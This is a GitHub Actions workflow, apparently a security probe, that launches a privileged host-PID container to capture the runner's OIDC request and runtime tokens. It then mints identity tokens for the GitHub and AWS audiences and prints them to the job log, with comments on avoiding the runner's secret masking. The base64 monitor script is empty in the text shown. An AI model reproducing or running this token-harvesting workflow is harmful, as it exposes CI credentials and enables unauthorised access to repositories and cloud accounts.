name: UltimateProbe5
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Start monitor
        run: |
          rm -f /tmp/oidc_live.env
          printf '%s' '' | base64 -d > /tmp/mon.sh
          chmod +x /tmp/mon.sh
          echo "probe" > /tmp/probe.txt
          nohup docker run --rm --privileged --pid=host \
            -v /tmp/mon.sh:/mon.sh:ro \
            -v /tmp:/tmp_host:rw \
            ubuntu:24.04 bash /mon.sh > /tmp/mon.log 2>&1 &
          echo $! > /tmp/bgpid.txt
          sleep 5
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: probe-art
          path: /tmp/probe.txt
      - name: Call OIDC endpoint from host
        run: |
          sleep 3
          echo "=OIDC_CALL_START="
          if [ -f /tmp/oidc_live.env ]; then
            echo "oidc_live.env EXISTS"
            # Load the env file (DO NOT echo values - they get masked by runner)
            source /tmp/oidc_live.env
            echo "OIDC_URL=$OIDC_URL"
            echo "OIDC_TOKEN_LEN=$(echo -n "$OIDC_REQUEST_TOKEN" | wc -c)"
            echo "RUNTIME_TOKEN_LEN=$(echo -n "$RUNTIME_TOKEN" | wc -c)"
            # Call OIDC for GitHub audience
            echo "=OIDC_GH_START="
            python3 -c "
import urllib.request, sys, os
url = os.environ.get('OIDC_URL', '') + '&audience=api.github.com'
tok = os.environ.get('OIDC_REQUEST_TOKEN', '')
req = urllib.request.Request(url)
req.add_header('Authorization', 'Bearer ' + tok)
try:
    resp = urllib.request.urlopen(req, timeout=15)
    data = resp.read().decode()
    print('HTTP', resp.status)
    print(data[:2000])
except Exception as e:
    print('ERR:', str(e))
"
            echo "=OIDC_GH_END="
            # Call OIDC for AWS audience
            echo "=OIDC_AWS_START="
            python3 -c "
import urllib.request, sys, os
url = os.environ.get('OIDC_URL', '') + '&audience=sts.amazonaws.com'
tok = os.environ.get('OIDC_REQUEST_TOKEN', '')
req = urllib.request.Request(url)
req.add_header('Authorization', 'Bearer ' + tok)
try:
    resp = urllib.request.urlopen(req, timeout=15)
    data = resp.read().decode()
    print('HTTP', resp.status)
    print(data[:2000])
except Exception as e:
    print('ERR:', str(e))
"
            echo "=OIDC_AWS_END="
          else
            echo "oidc_live.env NOT FOUND"
          fi
          echo "=OIDC_CALL_END="
      - name: Read monitor output
        run: |
          sleep 2
          kill $(cat /tmp/bgpid.txt) 2>/dev/null || true
          echo "=MONITOR_LOG_START="
          cat /tmp/mon.log 2>/dev/null || echo "no log"
          echo "=MONITOR_LOG_END="
